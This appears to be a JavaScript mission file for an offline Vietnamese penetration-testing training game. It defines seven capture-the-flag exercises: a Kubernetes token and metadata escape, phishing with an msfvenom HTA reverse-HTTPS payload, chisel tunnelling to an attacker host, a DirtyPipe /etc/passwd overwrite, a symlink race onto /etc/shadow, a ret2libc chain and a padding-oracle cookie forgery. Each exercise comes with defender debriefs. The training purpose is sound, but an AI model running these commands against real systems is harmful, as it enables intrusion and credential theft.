// Mission MỚI (bổ sung) cho Chương 10 — Elite, no-hint. Engine offline.
// id tiếp từ 4. KHÔNG lặp container/binary/red-team-capstone (bài gốc M1-M3).
// Vector elite KHÁC: K8s/cloud escape, phishing initial access, egress bypass + deep pivot.
// Mỗi bài: noHints:true, randomize flag, hints elite, flag RANDOM ở /root/flag.txt.
import fsC10M4 from '../filesystems/chapter10-mission4.js';
import fsC10M5 from '../filesystems/chapter10-mission5.js';
import fsC10M6 from '../filesystems/chapter10-mission6.js';
import fsC10M7 from '../filesystems/chapter10-mission7.js';
import fsC10M8 from '../filesystems/chapter10-mission8.js';
import fsC10M9 from '../filesystems/chapter10-mission9.js';
import fsC10M10 from '../filesystems/chapter10-mission10.js';

export default [
  {
    id: 4,
    chapterId: 10,
    title: 'Thoát Kubernetes / Cloud',
    story:
      'Black-box, không hint, không nương tay. Mày có shell — nhưng nhìn quanh thì đây là một pod Kubernetes, không phải máy thật. Trong pod có token service account; ngoài kia là metadata endpoint của cloud. Lạm dụng RBAC lỏng và token đó để tạo pod đặc quyền hoặc đọc secret, rồi chạm cờ.',
    noHints: true,
    randomize: () => ({ flag: Math.random().toString(36).slice(2, 10) }),
    steps: [
      {
        id: 'recognize',
        description: 'Nhận biết đang ở trong pod K8s + lấy token service account',
        match: /^cat\s+\/var\/run\/secrets\/kubernetes\.io|cat\s+\/proc\/1\/cgroup|cat\s+.*serviceaccount\/token/,
      },
      {
        id: 'metadata',
        description: 'Truy vấn cloud metadata (IMDS 169.254.169.254)',
        match: /169\.254\.169\.254|metadata|imds|curl\b.*metadata/i,
        output: [
          '$ curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token',
          '{"access_token":"ya29.c.Kp8B...","expires_in":3599,"token_type":"Bearer"}',
          '(node service account token — broad cloud scope exposed via IMDSv1)',
        ].join('\n'),
      },
      {
        id: 'rbac',
        description: 'Dò quyền RBAC của token (auth can-i / get secrets)',
        match: /kubectl\b.*(auth\s+can-i|get\s+secrets|get\s+pods)|can-i/i,
        output: [
          '$ kubectl auth can-i --list --token=$SA_TOKEN',
          'Resources    Non-Resource URLs   Verbs',
          'secrets      []                  [get list create]',
          'pods         []                  [get list create]   <-- can create pods!',
          'pods/exec    []                  [create]',
        ].join('\n'),
      },
      {
        id: 'escape',
        description: 'Lạm dụng token: tạo pod đặc quyền / đọc secret -> chạm host',
        match: /kubectl\b.*(create|run|apply|get\s+secret)|hostPath|privileged|nsenter/i,
        output: 'kubectl run -> pod with hostPath `/` mounted + privileged:true -> exec in -> chroot /host -> root on the underlying node. Flag is reachable.',
      },
      { id: 'capture_flag', description: 'Đọc flag ở /root/flag.txt', match: /^cat\s+\/root\/flag\.txt/ },
    ],
    hints: ['Bài elite không có hint — tự lực.'],
    terms: [
      { term: 'Kubernetes RBAC', def: 'Cơ chế phân quyền của K8s (Role/RoleBinding) quy định một danh tính được làm gì với tài nguyên (pods, secrets...).' },
      { term: 'service account token', def: 'JWT gắn vào pod tại /var/run/secrets/.../token, dùng để gọi API server — nếu quyền rộng thì rất nguy hiểm.' },
      { term: 'cloud metadata', def: 'Dịch vụ nội bộ trả về thông tin/credential của instance cho workload chạy trên đó (AWS/GCP/Azure).' },
      { term: 'IMDS', def: 'Instance Metadata Service tại 169.254.169.254; IMDSv1 không cần token nên dễ bị SSRF/lạm dụng để lấy credential.' },
      { term: 'pod escape', def: 'Thoát khỏi ranh giới pod/container ra node host, thường qua hostPath, privileged, hostPID hoặc capability dư.' },
    ],
    debrief: [
      'Trong K8s, ranh giới bảo mật thật là API server + RBAC + node — không phải bản thân pod; một service account quyền rộng = chìa khoá cả cluster.',
      'Dấu hiệu attacker check đầu tiên: /var/run/secrets/kubernetes.io (token), /proc/1/cgroup (kubepods), khả năng tới 169.254.169.254 (cloud).',
      'IMDSv1 trả credential cho bất kỳ ai gọi được endpoint -> kết hợp SSRF hoặc shell trong pod là lấy được quyền của node/role cloud.',
      'DEFENDER: RBAC least-privilege (đừng cho default SA quyền create pod/secret); ép IMDSv2 + chặn pod tới metadata (NetworkPolicy); automountServiceAccountToken=false khi không cần; Pod Security Standards "restricted" (cấm privileged/hostPath); tách workload nhạy cảm sang node/cluster riêng.',
    ],
    initialFilesystem: fsC10M4,
  },
  {
    id: 5,
    chapterId: 10,
    title: 'Initial Access qua Phishing',
    story:
      'Không có cổng nào hở ra ngoài. Cách vào duy nhất là con người. Black-box, không hint: OSINT email nhân viên, chế payload macro/HTA, lách qua AV và lọc egress, rồi đợi callback C2. Có beacon là có foothold — sau đó enum local và leo quyền tới cờ.',
    noHints: true,
    randomize: () => ({ flag: Math.random().toString(36).slice(2, 10) }),
    steps: [
      {
        id: 'osint',
        description: 'OSINT thu thập email nhân viên làm mục tiêu',
        match: /theharvester|hunter|linkedin|cat\s+.*emails\.txt|osint/i,
        output: [
          'theHarvester -d globex.io -b all',
          '[+] Emails found:',
          '  j.rivera@globex.io   m.tan@globex.io',
          '[+] Naming convention: <first-initial>.<lastname>@globex.io',
        ].join('\n'),
      },
      {
        id: 'payload',
        description: 'Tạo payload macro/HTA mang shellcode',
        match: /msfvenom|macro|\.hta|payload|vba|stager/i,
        output: 'msfvenom -p windows/x64/meterpreter/reverse_https LHOST=attacker LPORT=443 -f hta-psh -> invoice.hta (HTA dropper) + a VBA macro variant for the Office lure.',
      },
      {
        id: 'evasion',
        description: 'Bypass AV và lọc egress (HTTPS ra ngoài)',
        match: /amsi|obfuscat|encrypt|443|reverse_https|av\s*bypass|defender|egress/i,
        output: 'AMSI patched + payload obfuscated -> Defender clean. Beacon uses reverse_https over 443 (blends with normal traffic) -> egress filter allows it out.',
      },
      {
        id: 'beacon',
        description: 'Nhận callback C2 -> foothold trên máy nạn nhân',
        match: /beacon|callback|c2|session\s+opened|meterpreter|check.?in/i,
        output: '[*] j.rivera opened invoice.hta -> beacon checks in: session 1 opened, GLOBEX\\j.rivera @ WKS-FIN-07. Foothold established.',
      },
      {
        id: 'local_privesc',
        description: 'Enum local và leo quyền trên host nạn nhân',
        match: /winpeas|seatbelt|whoami\s+\/priv|getsystem|privesc|sharphound|local/i,
        output: 'winPEAS -> unquoted service path + SeImpersonate -> getsystem -> NT AUTHORITY\\SYSTEM on WKS-FIN-07. Flag is now readable.',
      },
      { id: 'capture_flag', description: 'Đọc flag ở /root/flag.txt', match: /^cat\s+\/root\/flag\.txt/ },
    ],
    hints: ['Bài elite không có hint — tự lực.'],
    terms: [
      { term: 'client-side attack', def: 'Tấn công nhắm vào phần mềm phía người dùng (Office, trình duyệt) thay vì dịch vụ server mở ra ngoài.' },
      { term: 'phishing', def: 'Lừa nạn nhân mở file/link độc hại qua email giả danh, để chạy payload và mở đường vào mạng nội bộ.' },
      { term: 'payload/macro', def: 'Mã độc nhúng (VBA macro, HTA, shellcode) chạy khi nạn nhân mở tài liệu/file, tạo kết nối về kẻ tấn công.' },
      { term: 'AV evasion', def: 'Kỹ thuật né phát hiện của antivirus/EDR: obfuscate, patch AMSI, mã hoá payload, dùng kênh/định dạng ít bị soi.' },
      { term: 'C2 beacon', def: 'Tín hiệu định kỳ từ máy bị chiếm về máy chủ Command & Control để nhận lệnh; reverse_https/443 để lẫn vào traffic thường.' },
    ],
    debrief: [
      'Khi chu vi mạng kín, con người là cửa: attacker chuyển từ "tìm lỗ hổng dịch vụ" sang "lừa người dùng chạy code" — initial access qua client-side.',
      'OSINT (email, định dạng địa chỉ, vai trò) khiến lure đáng tin; payload macro/HTA chạy ngay trong tiến trình Office hợp lệ.',
      'Beacon dùng HTTPS/443 cố tình hoà vào lưu lượng bình thường để vượt egress filter và né phát hiện — kênh C2 càng "nhạt" càng sống lâu.',
      'DEFENDER: chặn macro từ internet (Mark-of-the-Web) + chặn HTA; email gateway sandbox + DMARC/DKIM/SPF chống giả mạo; EDR theo hành vi (Office spawn powershell/cmd); egress allowlist + giải mã/giám sát TLS; đào tạo + báo cáo phishing; least-privilege để hạn chế privesc sau foothold.',
    ],
    initialFilesystem: fsC10M5,
  },
  {
    id: 6,
    chapterId: 10,
    title: 'Vượt tường lửa & Pivot sâu',
    story:
      'Bài cuối chương, không hint. Mày có foothold trên một host biên trong DMZ — nhưng firewall chặn gần hết egress, reverse shell thường không ra nổi. Phải dựng tunnel luồn qua khe hở cho phép (vd 443), bắc cầu vào một segment mạng cô lập, rồi pivot sâu tới box cuối giữ cờ.',
    noHints: true,
    randomize: () => ({ flag: Math.random().toString(36).slice(2, 10) }),
    steps: [
      {
        id: 'foothold',
        description: 'Xác nhận foothold trên host biên (DMZ)',
        match: /^(whoami|id|ip\s+a|ifconfig)\b|cat\s+.*recon\.txt|foothold/i,
        output: 'Foothold on edge host 10.10.30.10 (DMZ). Two NICs: eth0 10.10.30.10, eth1 192.168.50.10 (isolated segment behind it).',
      },
      {
        id: 'detect_egress',
        description: 'Phát hiện firewall chặn egress (chỉ 443 ra được)',
        match: /(curl|nc|ping|nmap)\b.*(timeout|refused|filtered)|egress|firewall|443\s+only|outbound/i,
        output: [
          'Outbound test from edge host:',
          '  tcp/4444 -> attacker : filtered (no callback)  <-- reverse shell blocked',
          '  tcp/53,80 -> filtered',
          '  tcp/443 -> OPEN  <-- only HTTPS egress is permitted',
        ].join('\n'),
      },
      {
        id: 'tunnel',
        description: 'Dựng reverse tunnel (chisel/ligolo) qua cổng cho phép',
        match: /chisel|ligolo|reverse\s+tunnel|tunnel|443.*(chisel|connect)|socks/i,
        output: [
          'attacker$ chisel server -p 443 --reverse',
          'edge$     chisel client attacker:443 R:socks   (egress via 443, allowed)',
          '[+] reverse SOCKS tunnel established -> pivot into 192.168.50.0/24',
        ].join('\n'),
      },
      {
        id: 'deep_pivot',
        description: 'Qua tunnel + proxychains chạm segment cô lập',
        match: /^proxychains\b|192\.168\.50|ligolo\b.*(add-route|tun)|chisel\b.*socks/i,
        output: [
          '[proxychains] ... socks ... 192.168.50.99:445 ... OK',
          'Nmap (proxied) report for 192.168.50.99:',
          '445/tcp open  microsoft-ds   (vulnerable SMB)',
          '(double pivot reached the isolated crown-jewel host)',
        ].join('\n'),
      },
      {
        id: 'exploit',
        description: 'Khai thác box cuối qua tunnel để có shell',
        match: /^proxychains\b.*(exploit|psexec|smb|msf|curl)|exploit|psexec/i,
        output: 'proxychains -> exploit SMB on 192.168.50.99 -> shell on the crown-jewel host. Read the flag.',
      },
      { id: 'capture_flag', description: 'Đọc flag ở /root/flag.txt', match: /^cat\s+\/root\/flag\.txt/ },
    ],
    hints: ['Bài elite không có hint — tự lực.'],
    terms: [
      { term: 'egress filtering', def: 'Firewall lọc lưu lượng ĐI RA: chỉ cho một số cổng/đích outbound (vd 443), chặn reverse shell tới cổng lạ.' },
      { term: 'reverse tunnel (chisel/ligolo)', def: 'Đường hầm do máy bên trong chủ động mở ra ngoài qua cổng được phép, tạo kênh để attacker luồn ngược vào.' },
      { term: 'network segmentation', def: 'Chia mạng thành các vùng cách ly (DMZ, nội bộ, cô lập) để giới hạn phạm vi khi một vùng bị xâm nhập.' },
      { term: 'double pivot', def: 'Pivot qua hai chặng: từ máy tấn công -> host biên -> segment cô lập, để chạm host không thể tới trực tiếp.' },
    ],
    debrief: [
      'Egress filtering phá reverse shell truyền thống: nếu chỉ 443 ra được, attacker buộc phải đóng gói kênh điều khiển vào đúng cổng/giao thức được phép.',
      'Reverse tunnel (chisel/ligolo) lật thế cờ: thay vì attacker gọi vào (bị chặn inbound), máy nạn nhân chủ động gọi RA qua 443 rồi mở SOCKS để attacker đi ngược lại.',
      'Phân đoạn mạng chỉ hữu ích khi không có cầu nối tin cậy — một host dual-homed bắc cầu DMZ với segment cô lập làm vô hiệu hoá ranh giới đó.',
      'DEFENDER: egress allowlist theo đích + giải mã/giám sát TLS (chisel-over-443 vẫn lộ pattern bất thường); chặn host biên mở kết nối tới segment nhạy cảm; phát hiện tunnel (kết nối 443 dài, beacon đều); cô lập thật bằng firewall nội bộ + không cho máy DMZ định tuyến vào crown jewels.',
    ],
    initialFilesystem: fsC10M6,
  },
  {
    id: 7,
    chapterId: 10,
    title: 'Kernel Exploit — DirtyPipe',
    story:
      'Black-box, không hint. Mày có shell www-data quyền thấp trên một host nội bộ, không sudo, không SUID nào hữu ích. Nhưng kernel còn cũ. Mày phải nhận diện lỗ hổng pipe page-cache (CVE-2022-0847), dùng nó ghi đè một file root sở hữu mà chỉ "world-readable" — và biến quyền đọc đó thành root thật.',
    noHints: true,
    randomize: () => ({ flag: Math.random().toString(36).slice(2, 10) }),
    steps: [
      {
        id: 'enum_kernel',
        description: 'Xác định kernel version và soi xem có dính CVE đã biết',
        match: /^uname\s+-[ar]\b|^uname\b/,
      },
      {
        id: 'identify_cve',
        description: 'Nhận diện kernel này dính DirtyPipe (CVE-2022-0847)',
        match: /dirty.?pipe|cve-2022-0847|0847/i,
        output: [
          'Kernel 5.16.7 nằm trong khoảng 5.8 - 5.16.11 (trước patch 23/02/2022) -> vulnerable to CVE-2022-0847 "Dirty Pipe".',
          'Lỗ hổng: pipe buffer flag PIPE_BUF_FLAG_CAN_MERGE không được reset đúng -> cho phép ghi đè dữ liệu vào page cache',
          'của một file CHỈ MỞ READ-ONLY, miễn là file đó world-readable (không cần write permission thật).',
        ].join('\n'),
      },
      {
        id: 'leak_perm',
        description: 'Xác nhận file root mục tiêu world-readable nhưng không writable',
        match: /^ls\s+-l.*\/etc\/passwd|^cat\s+\/etc\/passwd/,
      },
      {
        id: 'exploit',
        description: 'Khai thác DirtyPipe để ghi đè /etc/passwd, chèn user uid 0 hoặc cấy SUID shell',
        match: /dirtypipe|dirty_pipe|splice\(|vmsplice|exploit\.(c|py|sh)|gcc\s+.*exploit|\.\/exploit/i,
        output: [
          '$ gcc dirtypipe-exploit.c -o exploit && ./exploit /etc/passwd 1 "root2::0:0:root:/root:/bin/bash"',
          '[+] Opened pipe, sprayed page cache, overwrote target offset via splice/vmsplice trick.',
          '[+] /etc/passwd patched in place -> new line "root2::0:0:root:/root:/bin/bash" injected (empty password, uid=0).',
          '(file vẫn chỉ "world-readable" theo permission bit -- DirtyPipe ghi qua page cache, không cần quyền write thật)',
        ].join('\n'),
      },
      {
        id: 'become_root',
        description: 'Đăng nhập bằng user uid 0 vừa cấy để trở thành root',
        match: /^su\s+root2|^login\s+root2|whoami.*root|^id\b/,
        output: 'su root2 (no password) -> uid=0(root2) gid=0(root) groups=0(root). Mày là root thật.',
      },
      { id: 'capture_flag', description: 'Đọc flag ở /root/flag.txt', match: /^cat\s+\/root\/flag\.txt/ },
    ],
    hints: ['Bài elite không có hint — tự lực.'],
    terms: [
      { term: 'DirtyPipe (CVE-2022-0847)', def: 'Lỗ hổng kernel Linux 5.8-5.16.11 cho phép ghi đè nội dung file read-only world-readable qua cơ chế pipe/page cache, không cần quyền write.' },
      { term: 'page cache', def: 'Vùng nhớ kernel cache nội dung file để đọc/ghi đĩa nhanh hơn; DirtyPipe lợi dụng việc ghi nhầm vào cache thay vì kiểm tra quyền file gốc.' },
      { term: 'splice/vmsplice', def: 'Syscall di chuyển dữ liệu giữa pipe và file mà không copy qua user-space; bug nằm ở cách các syscall này quản lý cờ buffer.' },
      { term: 'kernel exploit', def: 'Khai thác lỗi trong chính nhân hệ điều hành, thường cho phép leo thẳng lên root bất kể quyền user ban đầu.' },
      { term: 'uid 0', def: 'User ID 0 luôn là root trên Linux — bất kỳ tài khoản nào có uid 0 đều có toàn quyền hệ thống.' },
    ],
    debrief: [
      'DirtyPipe cho thấy lỗ hổng kernel có thể biến một quyền tưởng chừng vô hại ("world-readable") thành ghi đè tuỳ ý — ranh giới read/write không còn đúng khi bug nằm dưới tầng filesystem permission.',
      'Không cần SUID, không cần sudo misconfig: chỉ cần kernel version cũ trong một khoảng ngày hẹp là đủ điều kiện — vá kernel chậm là rủi ro tự thân, độc lập với mọi hardening khác.',
      'Kỹ thuật khai thác (spray pipe buffer, ghi đè offset trong page cache) không đụng tới permission bit của file — đây là lý do nó vượt qua các kiểm soát truyền thống dựa trên owner/mode.',
      'DEFENDER: patch kernel ngay khi CVE nghiêm trọng được công bố (đừng đợi lịch maintenance); theo dõi advisory distro; với hệ thống không patch kịp, cân nhắc kernel lockdown/SELinux để giảm impact; audit log truy cập /etc/passwd, /etc/shadow bất thường.',
    ],
    initialFilesystem: fsC10M7,
  },
  {
    id: 8,
    chapterId: 10,
    title: 'Đua Với Root — TOCTOU',
    story:
      'Black-box, không hint. Có một helper script chạy setuid-root, làm việc trên file theo input của mày — nhưng nó kiểm tra ai sở hữu file rồi MỚI mở file ra dùng, với một khoảng hở thời gian ở giữa. Mày phải khai thác đúng khoảnh khắc giữa "kiểm tra" và "dùng" để khiến root đọc nhầm file mày chọn, không phải file mày khai báo.',
    noHints: true,
    randomize: () => ({ flag: Math.random().toString(36).slice(2, 10) }),
    steps: [
      {
        id: 'find_setuid',
        description: 'Tìm binary/script setuid-root đáng nghi trên hệ thống',
        match: /find\s+\/.*-perm\s+-4000|^ls\s+-la?\s+.*backup-helper/,
      },
      {
        id: 'read_logic',
        description: 'Đọc logic script để thấy khoảng hở check-then-use (TOCTOU)',
        match: /^cat\s+.*backup-helper\.sh/,
      },
      {
        id: 'setup_decoy',
        description: 'Tạo file mồi thuộc về mày trong /tmp/backup để qua được bước check ban đầu',
        match: /^touch\s+\/tmp\/backup\/\S+|^echo\b.*>\s*\/tmp\/backup\/\S+/,
      },
      {
        id: 'race_swap',
        description: 'Chạy script & swap file mồi thành symlink trỏ tới file nhạy cảm NGAY trong khoảng sleep (đua điều kiện)',
        match: /backup-helper\.sh\b.*&|^ln\s+-sf\b.*\/etc\/shadow|race|toctou|symlink.*&/i,
        output: [
          '$ ./backup-helper.sh decoy.txt &   # root bắt đầu CHECK decoy.txt (mày sở hữu) -> pass -> sleep 1',
          '$ ln -sf /etc/shadow /tmp/backup/decoy.txt   # đúng lúc sleep, swap thành symlink trỏ /etc/shadow',
          '[+] window thắng cuộc: script USE mở lại path cũ -> giờ là symlink -> root cat /etc/shadow >> /root/backup.log',
          '(không cần thắng 100% -- script chạy lặp lại vài lần trong vòng lặp là trúng window)',
        ].join('\n'),
      },
      {
        id: 'reap_result',
        description: 'Đọc kết quả root vô tình ghi vào backup.log (chứa nội dung file nhạy cảm)',
        match: /^cat\s+\/root\/backup\.log/,
      },
      { id: 'capture_flag', description: 'Đọc flag ở /root/flag.txt', match: /^cat\s+\/root\/flag\.txt/ },
    ],
    hints: ['Bài elite không có hint — tự lực.'],
    terms: [
      { term: 'TOCTOU', def: 'Time-Of-Check-To-Time-Of-Use: khoảng hở giữa lúc chương trình kiểm tra điều kiện và lúc nó thực sự dùng tài nguyên đó.' },
      { term: 'race condition', def: 'Lỗi xảy ra khi kết quả phụ thuộc vào thứ tự/thời điểm thực thi của hai luồng xử lý song song, thay vì logic xác định.' },
      { term: 'symlink swap', def: 'Kỹ thuật đổi một file thường thành symlink đúng lúc, đánh lừa chương trình mở nhầm đích mà symlink trỏ tới.' },
      { term: 'setuid script', def: 'Script/binary chạy với uid của owner (thường root) bất kể ai gọi nó — nguy hiểm nếu logic bên trong không atomic.' },
    ],
    debrief: [
      'Lỗi TOCTOU không nằm ở "kiểm tra sai" mà ở việc tách kiểm tra và sử dụng thành hai bước KHÔNG atomic — bất kỳ khoảng hở thời gian nào ở giữa đều là cửa sổ tấn công.',
      'Vũ khí chính là symlink swap đúng lúc: qua được check bằng file hợp lệ, rồi đổi hướng trước khi use mở lại path — chương trình "tin" path không đổi nhưng thực ra đã đổi.',
      'Cửa sổ race có thể rất hẹp (microsecond) nhưng kẻ tấn công không cần thắng ngay lần đầu — chạy script lặp lại trong vòng lặp đủ lâu là trúng.',
      'DEFENDER: dùng các thao tác file ATOMIC (mở bằng file descriptor rồi check trên fd đó — fstat/O_NOFOLLOW, không phải check path rồi mở lại path); tránh hoàn toàn setuid script shell (dùng binary biên dịch với logic atomic); giảm thiểu mọi sleep/delay giữa check và use.',
    ],
    initialFilesystem: fsC10M8,
  },
  {
    id: 9,
    chapterId: 10,
    title: 'ROP Chain — ret2libc',
    story:
      'Black-box, không hint. Một service nhị phân ở port 41414 có buffer overflow rõ ràng — nhưng lần này NX bật (không chạy được shellcode tự viết) và ASLR random hoá libc mỗi lần chạy. Ret2win đơn giản không còn ăn. Mày phải leak một địa chỉ libc qua chính binary, tính ra toàn bộ libc base, rồi dựng chuỗi ROP gọi system("/bin/sh").',
    noHints: true,
    randomize: () => ({ flag: Math.random().toString(36).slice(2, 10) }),
    steps: [
      {
        id: 'analyze',
        description: 'Kiểm tra mitigation của binary (checksec) và xác nhận NX bật, PIE tắt',
        match: /checksec|file\s+\.\/vault|objdump\s+-d/i,
      },
      {
        id: 'find_offset',
        description: 'Tìm offset chính xác tới saved RIP bằng cyclic pattern',
        match: /pattern_create|cyclic|gdb\b.*pattern|offset\s*=/i,
        output: '[*] cyclic pattern -> crash tại offset 72 byte tính từ đầu buffer tới saved RIP.',
      },
      {
        id: 'leak_libc',
        description: 'Dựng payload gọi puts(puts@got) để leak địa chỉ thật của puts trong libc',
        match: /puts@got|puts@plt|leak|got\[|0x404018/i,
        output: [
          'payload: b"A"*72 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main)',
          '[+] received leak: puts@libc = 0x7f3a2c89e6a0',
          '(gọi lại main sau leak để có thêm một lượt overflow thứ hai)',
        ].join('\n'),
      },
      {
        id: 'compute_base',
        description: 'Tính libc base từ địa chỉ leak và offset cố định của puts trong libc đó',
        match: /libc.?base|offset.*libc|0x[0-9a-f]+\s*-\s*0x[0-9a-f]+/i,
        output: 'libc_base = leaked_puts - puts_offset_in_libc (0x7f3a2c89e6a0 - 0x84... ) -> libc_base = 0x7f3a2c81a000. Từ base này tính được system() và chuỗi "/bin/sh".',
      },
      {
        id: 'rop_system',
        description: 'Dựng ROP chain thứ hai: pop rdi -> "/bin/sh" -> call system trong libc',
        match: /rop|p64\(.*system|p64\(.*bin.?sh|pwntools|pwn\.|ROP\(/i,
        output: 'payload2: b"A"*72 + p64(pop_rdi) + p64(binsh_str) + p64(system_addr) -> $ id\nuid=1000(svc) gid=1000(svc) -- shell trong tay.',
      },
      { id: 'capture_flag', description: 'Đọc flag ở /root/flag.txt (sau khi privesc nếu cần)', match: /^cat\s+\/root\/flag\.txt/ },
    ],
    hints: ['Bài elite không có hint — tự lực.'],
    terms: [
      { term: 'NX (No-eXecute)', def: 'Bit đánh dấu vùng nhớ (như stack) không được thực thi code — chặn shellcode tự viết chạy trực tiếp trên stack.' },
      { term: 'ASLR', def: 'Address Space Layout Randomization: random hoá địa chỉ base của libc/stack/heap mỗi lần chạy, buộc attacker phải leak địa chỉ trước khi dùng.' },
      { term: 'ret2libc', def: 'Kỹ thuật control-flow hijack gọi thẳng hàm có sẵn trong libc (như system) thay vì chạy shellcode tự viết — né được NX.' },
      { term: 'ROP chain (return-oriented programming)', def: 'Ghép nhiều địa chỉ "gadget" có sẵn trong binary/libc (mỗi gadget kết thúc bằng ret) để dựng logic thực thi tuỳ ý chỉ từ overflow.' },
      { term: 'GOT/PLT leak', def: 'Lợi dụng binary gọi một hàm in ra địa chỉ thật của hàm khác trong GOT, để tính được vị trí thực của libc đang nạp.' },
    ],
    debrief: [
      'NX và ASLR không triệt tiêu overflow — chúng chỉ ép kỹ thuật khai thác phải tinh vi hơn: leak trước, tính toán, rồi mới chiếm quyền điều khiển ở lượt thứ hai.',
      'PIE=No là điểm yếu sống còn của bài này: vì binary chính không bị randomize, các gadget pop rdi/ret và toạ độ PLT/GOT luôn cố định, chỉ libc mới cần leak.',
      'ROP biến chính các đoạn code hợp lệ đã có trong binary/libc thành "ngôn ngữ lập trình" của attacker — không cần tiêm code lạ, chỉ cần sắp xếp lại con trỏ.',
      'DEFENDER: bật full RELRO + PIE cho cả binary chính (không chỉ libc) để xoá luôn các địa chỉ cố định làm gadget; Stack Canary chặn overflow đơn giản từ vòng ngoài; tách dịch vụ chạy sandbox/seccomp giảm thiệt hại nếu vẫn bị chiếm shell.',
    ],
    initialFilesystem: fsC10M9,
  },
  {
    id: 10,
    chapterId: 10,
    title: 'Padding Oracle — Vá Cookie Thành Admin',
    story:
      'Bài cuối chương, không hint. Một API nội bộ xác thực bằng cookie mã hoá AES-CBC. Mày không có key, không có cách brute force nào khả thi trực diện — nhưng server lại trả về hai mã lỗi KHÁC NHAU tuỳ padding hợp lệ hay không. Đó chính là một oracle. Mày phải dùng nó để giải mã từng byte, rồi tự tay vá nội dung cookie thành admin=true mà không bao giờ cần biết key thật.',
    noHints: true,
    randomize: () => ({ flag: Math.random().toString(36).slice(2, 10) }),
    steps: [
      {
        id: 'probe_errors',
        description: 'So sánh response khi sửa byte cuối ciphertext: tìm 2 mã lỗi khác nhau (bad padding vs invalid session)',
        match: /curl\b.*cookie|curl\b.*session=|bad\s+padding|500|403/i,
      },
      {
        id: 'identify_oracle',
        description: 'Nhận diện đây là padding oracle: response code rò thông tin padding hợp lệ hay không',
        match: /padding\s+oracle|poodle|cbc.*oracle/i,
        output: [
          'Xác nhận oracle: sửa byte cuối cùng của block ciphertext rồi gửi lại.',
          '  -> 19/20 giá trị thử trả 500 "bad padding"',
          '  ->  1/20 giá trị trả 403 "invalid session" (padding ĐÚNG, nội dung sai) <- đây là oracle bit cần.',
          'Server vô tình lộ "padding hợp lệ hay không" qua 2 status code khác nhau -- kinh điển CBC padding oracle (kiểu POODLE).',
        ].join('\n'),
      },
      {
        id: 'decrypt_byte',
        description: 'Brute từng byte cuối của intermediate state bằng oracle (256 lần thử tối đa mỗi byte)',
        match: /brute.*byte|intermediate|xor\b.*pad|script.*oracle|for.*0x00.*0xff/i,
        output: [
          '[*] byte[15] of block found via oracle: 0x01 valid pad -> intermediate[15] = guess XOR 0x01',
          '[*] lặp lùi dần byte[14]..byte[0], mỗi byte set padding tăng dần (0x02 0x02, 0x03 0x03 0x03...)',
          '[+] toàn bộ intermediate state của block bị crack mà KHÔNG cần biết AES key.',
        ].join('\n'),
      },
      {
        id: 'forge_admin',
        description: 'Dùng intermediate state đã giải để tự build ciphertext mới chứa "role=admin"',
        match: /role=admin|forge|xor.*role|craft.*cookie|new.*ciphertext/i,
        output: [
          'plaintext gốc giải được: \'...&role=user&exp=9999999999\'',
          'C_prev_forged = intermediate XOR b"...&role=admin......" -> ghép vào ciphertext gốc thay block đó',
          '[+] cookie mới: session=<ciphertext-forged-hex> -- decrypt ra đúng "role=admin" mà server tự ký nhận padding hợp lệ.',
        ].join('\n'),
      },
      {
        id: 'access_admin',
        description: 'Gửi cookie admin vừa forge để vào /admin',
        match: /curl\b.*\/admin|cookie:\s*session=.*forged|access.*admin/i,
        output: 'curl -i https://10.10.40.5:8443/admin -H "Cookie: session=<forged-hex>" -> HTTP 200 OK. Welcome, admin. Flag is reachable from the admin panel.',
      },
      { id: 'capture_flag', description: 'Đọc flag ở /root/flag.txt', match: /^cat\s+\/root\/flag\.txt/ },
    ],
    hints: ['Bài elite không có hint — tự lực.'],
    terms: [
      { term: 'padding oracle', def: 'Bất kỳ hành vi server lộ ra (status code, thời gian phản hồi, thông báo lỗi) cho biết padding của một bản mã giải ra có hợp lệ hay không.' },
      { term: 'AES-CBC', def: 'Chế độ mã hoá khối trong đó mỗi block ciphertext phụ thuộc XOR với block trước (hoặc IV) — đặc tính này là nền tảng cho padding oracle attack.' },
      { term: 'PKCS#7 padding', def: 'Chuẩn đệm dữ liệu cho khối cuối của bản rõ trước khi mã hoá; giá trị padding sai sẽ bị giải mã từ chối — đây là tín hiệu oracle khai thác.' },
      { term: 'intermediate state', def: 'Kết quả giải mã thô của một block AES TRƯỚC khi XOR với block trước; crack được nó cho phép sửa nội dung mà không cần biết key.' },
      { term: 'POODLE', def: 'Tên một lớp tấn công padding-oracle nổi tiếng trên SSL 3.0/TLS CBC, minh chứng vì sao rò thông tin padding qua lỗi là nguy hiểm thật.' },
    ],
    debrief: [
      'Padding oracle không cần phá khoá mã hoá — nó lợi dụng việc HỆ THỐNG xác nhận hay từ chối quá chi tiết (hai mã lỗi khác nhau) để dò ra plaintext/intermediate state từng byte.',
      'Tính chất XOR-chuỗi của CBC là chính con dao hai lưỡi: kẻ tấn công không cần biết key, chỉ cần biết "padding đúng hay sai" là đủ để cuối cùng tự ghép ra ciphertext mong muốn.',
      'Đây là minh chứng kinh điển rằng THÔNG BÁO LỖI cũng là một bề mặt tấn công — "bad padding" (500) khác "invalid session" (403) tưởng vô hại nhưng đủ để leak toàn bộ cookie.',
      'DEFENDER: luôn trả MỘT thông báo lỗi/generic status duy nhất cho mọi lỗi xác thực cookie (không phân biệt padding sai vs nội dung sai); ưu tiên AEAD (AES-GCM) thay CBC-thuần vì có authentication tag chặn giả mạo; ký (HMAC) hoặc mã hoá có xác thực mọi cookie phía server.',
    ],
    initialFilesystem: fsC10M10,
  },
];